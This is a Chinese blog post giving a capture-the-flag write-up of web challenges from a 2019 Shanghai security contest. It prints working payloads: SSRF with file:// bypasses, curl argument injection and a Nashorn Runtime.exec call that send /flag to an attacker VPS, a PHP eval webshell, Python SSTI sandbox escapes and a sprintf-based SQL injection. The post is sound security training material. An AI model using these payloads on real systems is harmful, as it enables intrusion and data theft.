<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="2019神盾杯上海市网络安全竞赛Web题解"><meta name="keywords" content="CTF"><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>2019神盾杯上海市网络安全竞赛Web题解 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyadmin"><span class="toc-number">1.</span> <span class="toc-text">easyadmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easygallery-1"><span class="toc-number">2.</span> <span class="toc-text">easygallery-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easygallery-2"><span class="toc-number">3.</span> <span class="toc-text">easygallery-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload"><span class="toc-number">4.</span> <span class="toc-text">easyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fast-calc-2"><span class="toc-number">5.</span> <span class="toc-text">fast_calc_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fast-calc-1"><span class="toc-number">6.</span> <span class="toc-text">fast_calc_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easysqli"><span class="toc-number">7.</span> <span class="toc-text">easysqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parser"><span class="toc-number">8.</span> <span class="toc-text">parser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easymanager"><span class="toc-number">9.</span> <span class="toc-text">easymanager</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cat-market"><span class="toc-number">10.</span> <span class="toc-text">cat market</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.jpg"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">人若无名，方可潜心练剑</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">230</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">90</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io">osword</a><a class="author-info-links__name text-center" href="https://nikoeurus.github.io">Somnus</a><a class="author-info-links__name text-center" href="https://landgrey.me">LandGrey</a><a class="author-info-links__name text-center" href="https://www.cnpanda.net">panda</a><a class="author-info-links__name text-center" href="http://foreversong.cn">ADog</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/backgroud.jpeg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a><a class="site-page" href="/read">Read</a></span></div><div id="post-info"><div id="post-title">2019神盾杯上海市网络安全竞赛Web题解</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF竞赛训练/">CTF竞赛训练</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>本场比赛Web类题目共有11题，本WP仅写了其中10题，由于环境关闭，剩余一题未能复盘。</p>
<h2 id="easyadmin"><a href="#easyadmin" class="headerlink" title="easyadmin"></a>easyadmin</h2><p>cookie使用了jwt，爆破key并伪造role值为admin，登陆即可获得flag</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/1.png" alt="1"><a id="more"></a></p>
<h2 id="easygallery-1"><a href="#easygallery-1" class="headerlink" title="easygallery-1"></a>easygallery-1</h2><p>HTML源码里面提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $flag=<span class="string">'flag in the /flag'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>还有一个如下链接：<a href="http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg" target="_blank" rel="noopener">http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg</a> </p>
<p>猜测可能是SSSRF读取/flag。先在自己VPS上随便写一个 <code>&lt;?php phpinfo();?&gt;</code>，然后让题目尝试加载</p>
<p><a href="http://xxxx/gallery.php?path=http://VPS/index.php" target="_blank" rel="noopener">http://xxxx/gallery.php?path=http://VPS/index.php</a> 发现是空的，怀疑是不是有后缀jpg限制，所以尝试<br><a href="http://xxxx/gallery.php?path=http://VPS/index.php%23.jpg" target="_blank" rel="noopener">http://xxxx/gallery.php?path=http://VPS/index.php%23.jpg</a><br>发现题目成功访问了我的VPS，并获得了PHPINFO内容。那么接下来就同样尝试使用file协议读取/flag。这里之所以加一个%23，是因为在HTML中，%23是锚点，所以后端程序获得的path参数对应的值为file:///flag，而加了%23.jpg又可以绕过题目限制。还可以看一下后端是使用什么程序发起请求的：</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/2.png" alt="2"></p>
<p>最终payload：<a href="http://xxxx/gallery.php?path=file:///flag%23.jpg" target="_blank" rel="noopener">http://xxxx/gallery.php?path=file:///flag%23.jpg</a> </p>
<h2 id="easygallery-2"><a href="#easygallery-2" class="headerlink" title="easygallery-2"></a>easygallery-2</h2><p>同样，在HTML源码里面有这样一个链接</p>
<p><a href="http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg" target="_blank" rel="noopener">http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg</a><br>这次再使用file:///flag%23.jpg 会提示scheme error!，说明后端代码可能禁用了file协议。使用上题相同的方法，可以发现后台使用的是curl来访问我们的VPS。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/3.png" alt="3"></p>
<p>猜测后台可能是直接用拼接字符串，然后执行curl命令。尝试访问 <a href="http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg" target="_blank" rel="noopener">http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg</a> 发现其请求是 POST方式，所以这题很有可能是命令执行。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/4.png" alt="4"></p>
<p>尝试使用 <a href="http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg" target="_blank" rel="noopener">http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg</a> 没有获得flag，继续尝试curl的-F参数。最终payload：<br><a href="http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg" target="_blank" rel="noopener">http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg</a></p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/5.png" alt="5"></p>
<h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><p>上传文件后没有回显文件地址，但以base64图片形式显示。page参数存在文件包含，但是过滤了://无法使用php伪协议读取源码。后台代码应该类似 <code>include $_GET[&#39;page&#39;].&#39;.php&#39;;</code> 。上传zip文件时，还会显示显示不允许的文件类型!upload jpg or gif。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/6.png" alt="6"></p>
<p>上传图片处还有一个功能，可以填在线图片地址，我们可以通过这里结合file协议读取/etc/passwd</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/7.png" alt="7"></p>
<p>源码里面base64解密就是文件内容。尝试读取 /var/www/html/index.php 等文件都失败了，可能网站路径不是这个。但是我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/8.png" alt="8"></p>
<p>file:///proc/self/cwd/index.php</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/9.png" alt="9"></p>
<p>file:///proc/self/cwd/upload.php</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/10.png" alt="10"></p>
<p>这题我们前面说过可以直接添加GIF89a上传图片马，接下来就是要找到图片路径了。<br>路径定义在upload.php中，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$name= $_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>];</span><br><span class="line">$ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">$filename=basename($name,$ext);</span><br><span class="line">$rootpath=$ddir.md5($filename).<span class="string">"."</span>.$name;</span><br></pre></td></tr></table></figure>

<p>这样我们就可以获得图片路径了 <code>/proc/self/cwd/$rootpath</code> 。接下来直接利用题目最开始的文件包含 <a href="http://xxxx/index.php?page=submit" target="_blank" rel="noopener">http://xxxx/index.php?page=submit</a> 但是这里还有一个坑。坑在upload.php中有这样一段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^ph(.*)$/i'</span>,$ext))&#123;</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>,<span class="string">'phps'</span>])) &#123;</span><br><span class="line">        file_put_contents($rootpath,preg_replace(<span class="string">"/\?/"</span>,<span class="string">""</span>,file_get_contents($rootpath)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会把文件中的 <code>?</code> 号给去掉，所以我们不能用 <code>&lt;?php phpcode;?&gt;</code> 这种写法，而要用 <code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_GET[_]);&lt;/script&gt;</code> 接着直接包含即可执行命令：）当然，也可以不使用包含，直接访问马的路径。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/11.png" alt="11"></p>
<h2 id="fast-calc-2"><a href="#fast-calc-2" class="headerlink" title="fast_calc_2"></a>fast_calc_2</h2><p>请求包类似：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/calc.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: b4b74052eed440eb9c7899c932f61b6ce79f555733524dc2.changame.ichunqiu.com</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; UM_distinctid=16b3177db8f50f-05893ba84daad1-1b29140e-100200-16b3177db90396; pgv_pvi=517607424; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1559903068,1560408162; __jsluid=ab86d4cd5c34bd66f80a8891dc2e731e; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1560434036</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Content-Length</span>: 27</span><br><span class="line"></span><br><span class="line">&#123;"target":"/","expr":"1+1"&#125;</span><br></pre></td></tr></table></figure>

<p>fuzz一下，发现可能是python的SSTI</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/12.png" alt="12"></p>
<p>发现ban了 <code>[]</code> ，于是本地测成功一个payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__class__'</span>).__base__.__getattribute__(().__class__.__mro__.__getitem__(<span class="number">1</span>),<span class="string">'__subc'</span>+<span class="string">'lasses__'</span>)().__getitem__(<span class="number">40</span>)(<span class="string">'/flag'</span>).__getattribute__(<span class="string">'read'</span>)()</span><br></pre></td></tr></table></figure>

<p>但是题目提示没有 <code>__base__</code> 属性，怀疑该属性应该是被ban了。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/13.png" alt="13"></p>
<p>后来队友测出直接用open方法，用空格隔开方法名和括号即可直接读取flag。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/14.png" alt="14"></p>
<p>然后看了一下源码</p>
<p>/proc/self/cwd/calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$data = json_decode($data,<span class="keyword">true</span>);</span><br><span class="line">$encode_data = base64_encode($data[<span class="string">'expr'</span>]);</span><br><span class="line">system(<span class="string">'python ./final.py '</span>.$encode_data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>/proc/self/cwd/final.py</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/15.png" alt="15"></p>
<h2 id="fast-calc-1"><a href="#fast-calc-1" class="headerlink" title="fast_calc_1"></a>fast_calc_1</h2><p>初步判断，后端代码可能用的是nodejs或者JavaScript。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/16.png" alt="16"></p>
<p>尝试用Object.getOwnPropertyNames(this).join(‘::::::’)读取一下this对象属性，发现有java</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/17.png" alt="17"></p>
<p>再次尝试java.language.String，可以确认后端用的是Java了</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/18.png" alt="18"></p>
<p>Java中有一个新特性可以把JavaScript转成Java代码，所以这里可以执行JavaScript，即Nashorn<br>接下来尝试使用java代码读取flag</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/calc.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;"target":"/","expr":"java.lang.Runtime.getRuntime().exec('curl VPS -d @/flag')"&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/19.png" alt="19"></p>
<h2 id="easysqli"><a href="#easysqli" class="headerlink" title="easysqli"></a>easysqli</h2><p>两个点：</p>
<ul>
<li>username和password经过addslashes函数处理。</li>
<li>当username为admin时，会显示后台执行的sql语句。</li>
</ul>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/20.png" alt="20"></p>
<p>利用条件比较苛刻，所以正常的SQL注入姿势是绕不过的，只能想到配合sprintf字符串格式化漏洞进行绕过，具体参考：<a href="https://paper.seebug.org/386/" target="_blank" rel="noopener">https://paper.seebug.org/386/</a> 。猜测后台代码应该类似这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$user = addslashes($_GET[<span class="string">'user'</span>]);</span><br><span class="line">$pass = addslashes($_GET[<span class="string">'pass'</span>]);</span><br><span class="line">$sql = sprintf(<span class="string">"select * from users where username='%s' and password='$pass'"</span>,$user);</span><br></pre></td></tr></table></figure>

<p>最终利用payload： <code>http://xxxx//result.php?user=admin&amp;pass=%1$&#39;=0#</code> </p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/21.png" alt="21"></p>
<h2 id="parser"><a href="#parser" class="headerlink" title="parser"></a>parser</h2><p>题目附件：<br><a href="https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA</a> 密码：qppg</p>
<p>我们需要把解析后的AST文件翻译成PHP代码。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/22.png" alt="22"></p>
<p>比如上面这段代码，翻译成PHP代码类似：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    (<span class="string">'var_'</span>.$_GET[<span class="string">'num'</span>])(<span class="string">'cat /flag'</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>具体参考：<a href="https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y" target="_blank" rel="noopener">https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y</a></p>
<p>上面的代码告诉我们，肯定有一个变量var_xxx其值可以为命令执行函数，例如：system函数。那么我们先来看一下这些var_xxx变量的命名规则：</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/23.png" alt="23"></p>
<p>可以看到 <code>var_</code> 后面基本上跟的都是数字，那这题就很简单了，直接用BurpSuite爆破就行了。如果这题<code>var_</code> 后面跟的是不规则的字符，那可能就要全部还原一下PHP代码了。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/24.png" alt="24"></p>
<h2 id="easymanager"><a href="#easymanager" class="headerlink" title="easymanager"></a>easymanager</h2><p>题目提示：一个内部站点 所以可能存在内网。注册用户后登录，查看页面源代码会发现一个hint<br>hint: function.php source code may help u 发现存在 <code>function.php~</code> 文件。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/25.png" alt="25"></p>
<p>访问 http:///xxxxxx/index.php?page=host ，会提示Permission Deny! 根据上面代码开头check_url函数可知，程序使用parse_url来解析url，而parse_url函数存在bypass。于是访问 http:///xxxxxx///index.php?page=host</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/26.png" alt="26"></p>
<p>虽然是显示404，但是这个页面的源码中又有提示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Under repair .. host page can be access temporarily via 70b185c80f225924f86d4a1dedddd120.php --&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接访问<a href="http://xxxx/70b185c80f225924f86d4a1dedddd120.php" target="_blank" rel="noopener">http://xxxx/70b185c80f225924f86d4a1dedddd120.php</a> 会提示you can not visit it directly。所以我们要 <a href="http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120" target="_blank" rel="noopener">http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120</a> 这样访问。<br>发现可以上传zip格式文件，那就可以考虑一下zip协议。上传一个zip压缩马，会发现其会读取zip文件的内容。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/27.png" alt="27"></p>
<p>那么我们可以尝试创建软链接文件，将其打包成zip并上传，这样就可以读取网站源码了。例如下面读取index.php源码。</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/28.png" alt="28"></p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/29.png" alt="29"></p>
<p>index.php</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/30.png" alt="30"></p>
<p>host.php、function.php</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/31.png" alt="31"></p>
<p>/etc/apache2/sites-available/000-default.conf</p>
<p><img src="/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/32.png" alt="32"></p>
<p>尝试读取 <code>/flag</code> 没读到。发现/etc/apache2/sites-available/000-default.conf中有/var/www/html/m4nag3r_u_dont_know目录，访问<a href="http://xxxx/m4nag3r_u_dont_know/index.php" target="_blank" rel="noopener">http://xxxx/m4nag3r_u_dont_know/index.php</a> 出错，那么尝试读取/var/www/html/m4nag3r_u_dont_know/index.php源码</p>
